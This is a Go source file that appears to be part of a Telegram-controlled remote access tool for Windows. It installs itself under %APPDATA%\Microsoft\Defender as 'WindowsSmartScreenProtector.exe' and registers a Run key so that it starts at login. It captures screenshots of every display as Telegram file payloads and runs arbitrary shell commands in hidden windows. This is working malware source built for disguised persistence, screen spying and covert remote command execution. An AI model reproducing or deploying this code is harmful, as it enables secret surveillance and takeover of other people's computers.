package main

import (
	"bytes"
	"fmt"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
	"github.com/kbinani/screenshot"
	"golang.org/x/sys/windows/registry"
	"image/png"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

func Uninstall() (bool, error) {
	appdata := os.Getenv("APPDATA")
	filePath := fmt.Sprintf("%v\\%v", appdata, "Microsoft\\Defender\\WindowsSmartScreenProtector.exe")
	dir, _ := splitPath(filePath)
	err := os.RemoveAll(dir)
	if err != nil {
		return false, err
	}
	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		return false, err
	}
	defer k.Close()
	err = k.DeleteValue("MicrosoftSmartScreenProtector")
	if err != nil {
		return false, err
	}
	return true, nil
}

func Install(programPath string) (bool, error) {
	appdata := os.Getenv("APPDATA")
	dirPath := fmt.Sprintf("%v\\%v", appdata, "Microsoft\\Defender")
	filePath := fmt.Sprintf("%v\\%v", dirPath, "WindowsSmartScreenProtector.exe")
	err := createPathIfNotExist(dirPath)
	if err != nil {
		return false, err
	}
	_, err = copyFile(programPath, filePath)
	if err != nil {
		return false, err
	}

	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		return false, err
	}
	defer k.Close()
	err = k.SetStringValue("MicrosoftSmartScreenProtector", filePath)
	if err != nil {
		return false, err
	}
	return true, nil
}

func TakeScreenShot() (result []tgbotapi.FileBytes, err error) {
	n := screenshot.NumActiveDisplays()
	result = make([]tgbotapi.FileBytes, n)
	for i := 0; i < n; i++ {
		img, err := screenshot.CaptureDisplay(i)
		if err != nil {
			return nil, err
		}
		buff := new(bytes.Buffer)
		err = png.Encode(buff, img)
		name := fmt.Sprintf("ScreenShot%v.png", i)
		result[i] = tgbotapi.FileBytes{Name: name, Bytes: buff.Bytes()}
	}
	return result, nil
}

func StartCommand(command string) string {
	args := strings.Fields(command)
	if len(args) < 2 {
		args = append(args, "")
	}
	cmd := exec.Command(args[0], args[1:]...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Failed: %v", err)
	}
	return fmt.Sprintf("Combined out:\n%s\n", string(out))
}

func RunCommand(command string) string {
	fullCmd := append([]string{"/C"}, strings.Fields(command)...)
	cmd := exec.Command("cmd", fullCmd...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Failed: %v", err)
	}
	return fmt.Sprintf("Combined out:\n%s\n", string(out))
}
